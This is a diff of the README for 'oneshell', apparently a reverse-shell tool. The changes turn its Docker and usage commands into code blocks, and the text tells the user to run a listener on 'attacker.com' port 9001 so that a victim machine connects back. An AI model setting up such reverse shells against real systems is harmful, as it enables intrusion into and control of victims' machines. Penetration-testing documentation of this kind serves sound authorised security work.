@@ -1,10 +1,18 @@
 # One Shell To Rule Them All
 
+![image](https://github.com/user-attachments/assets/4a390578-47cb-423a-87ca-ad681a46731c)
+
 # Installation
 
 **Docker**
 
-Replace `oneshell` commands with `docker run --rm -it -p 9001:9001 tantosec/oneshell`. Remember to update the value of the `-p` option to the port you are using.
+Replace `oneshell` commands with the following:
+
+```bash
+docker run --rm -it -p 9001:9001 tantosec/oneshell
+```
+
+> Remember to update the value of the `-p` option to the port you are using.
 
 **Local install**
 
@@ -16,11 +24,15 @@ go install github.com/tantosec/oneshell@latest
 
 If you want your payload to connect back to `localhost` on port `9001`, run the following command:
 
-`oneshell -t localhost -p 9001`
+```bash
+oneshell -t localhost -p 9001
+```
 
 In the real world, you will probably have an internet accessible server (for example `attacker.com`) with a firewall that allows port `9001` through. As you want the victim to connect back to `attacker.com`, you will run a command like this on the `attacker.com` machine:
 
-`oneshell -t attacker.com -p 9001`
+```bash
+oneshell -t attacker.com -p 9001
+```
 
 You should receive output similar to the following:
 
